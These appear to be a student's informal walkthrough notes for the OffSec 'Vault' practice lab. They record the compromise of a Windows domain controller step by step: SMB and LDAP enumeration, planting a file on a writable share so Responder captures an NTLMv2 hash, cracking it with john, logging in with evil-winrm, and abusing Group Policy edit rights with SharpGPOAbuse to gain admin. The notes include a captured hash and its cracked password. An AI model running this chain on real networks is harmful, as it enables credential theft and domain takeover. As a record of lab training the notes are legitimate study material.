Services identified


DNS
- Domain Name = vault.offsec
- Computer Name = DC.vault.offsec
- Product version: 10.0.17763

Kerberos
RDP
Netbios it appears? @ 139
	- Domain name here is VAULT
	- Computer name here is DC
SMB likely via 445
- 1nmblookup -A
- 2nbtscan IP
- 3nmap --script nbstat.nse IP
4 nbstat -A IP
- 1smbmap -H IP 
- 2smbclient -L IP
-3smbclient //IP/guest

LDAP of course
	- NMAP LDAP Scan
	- The LDAPsearch dump once creds are found
- Domain Name = vault.offsec

LDAP Findings:

|       rootDomainNamingContext: DC=vault,DC=offsec
|       ldapServiceName: vault.offsec:dc$@VAULT.OFFSEC
|       dnsHostName: DC.vault.offsec
|       defaultNamingContext: DC=vault,DC=offsec


SMBFindings:

└─$ smbclient -L 192.168.240.172
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.

└─$ smbclient \\\\192.168.240.172\\DocumentsShare
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ^C

gonna want to essentially put a file here for an admin to peep then have
responder give credentials.

POST HASH CAPTURE OUTPUT
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.240.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:0d7055a84ec1d36b:27103B4D0FDA8CDE5A5B9442CDB9E57C:01010000000000000007C08A3903D9019F525B12C20142FF000000000200080053005A003600440001001E00570049004E002D0042005500360046004300480051004300350047004B0004003400570049004E002D0042005500360046004300480051004300350047004B002E0053005A00360044002E004C004F00430041004C000300140053005A00360044002E004C004F00430041004C000500140053005A00360044002E004C004F00430041004C00070008000007C08A3903D90106000400020000000800300030000000000000000100000000200000F98293C1B0FA7DF1BB4D2AA922744F608ABEA5BFB1464793B2309758298428F00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340039002E003200340030000000000000000000                                                                                                                                                                                                               
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh

Take the git as a potential payload jaunt for future use


john --wordlist=/home/kali/Downloads/rockyou.txt hasht.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:04 DONE (2022-11-28 15:16) 0.2341g/s 2484Kp/s 2484Kc/s 2484KC/s Seifer1..Schs93
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

Credentials gotten, now we run evil-winrm
 evil-winrm -i 192.168.240.172 -u anirudh -p SecureHM


Other services/ports

445? SMB?
464: kpasswd5?
593: ncan_http
3389: ms-wbt-server

Esca;ation: Let's start off by checking if our user has access to modify any Group Policy Objects. We can use helper PowerShell modules to assist us with finding the information we need. Let's copy PowerView.ps1 to our working directory on our Kali host.

┌──(kali㉿kali)-[~]
└─$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

Add "-s ." to evilwinrm to give access to powershell scripts in homedirectory

call powerview.ps1/use command

We can now run Get-NetGPO to list GPOs.

THEN

We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet Get-GPPermission. Let's check our permissions on the Default Group Policy.


Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh

Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False

We can take advantage of GPO Security permissions since we can edit them

wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe


So here it is basically using this exe file to add an admin to the default domain policy

command:
/SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

not as i thought we use is okie

gpupdate /force to update group policy

confirm via net localgroup Administrators

let's login as new admin
python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116

then go to root C drive, users, admin, desktop for flag


What did we learn here? 
Syntax is king of course, lets separate shit in this box

We have enumeration:
Doing as much as you can, and tackling the low hanging fruit

	- Searching for anonymous login on SMB or anon bind on LDAP
	- file inclusion on SMB via anon/guest

For this specific one we had the file inclusion to steal a user's hash

crack hash w john

initial foothold

Then we tried to take advantage of insecure read/write permissions

succeeded and added us as an admin
